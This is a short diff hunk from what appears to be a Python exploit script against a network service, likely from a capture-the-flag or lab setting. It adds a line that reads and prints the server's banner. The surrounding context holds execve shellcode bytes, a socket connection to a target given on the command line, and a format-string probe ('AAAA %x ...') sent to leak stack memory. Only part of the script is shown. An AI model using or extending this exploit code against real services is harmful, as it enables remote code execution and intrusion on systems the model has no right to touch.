@@ -38,6 +38,10 @@ sc += "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 s = socket.socket()
 s.connect((sys.argv[1], int(sys.argv[2])))
 
+line = readLine(s)
+sys.stdout.write(line)
+
+
 s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
 line = readLine(s)
 
